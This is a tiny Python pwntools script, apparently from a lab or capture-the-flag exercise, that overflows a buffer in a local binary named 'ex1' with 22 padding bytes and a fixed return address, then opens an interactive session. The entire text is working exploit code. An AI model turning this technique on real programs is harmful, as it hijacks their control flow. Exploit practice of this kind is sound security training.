from pwn import *

payload = b"A" * (18 + 4) + p32(0x08049176)
p = process("ex1")
p.sendline(payload)

p.interactive()
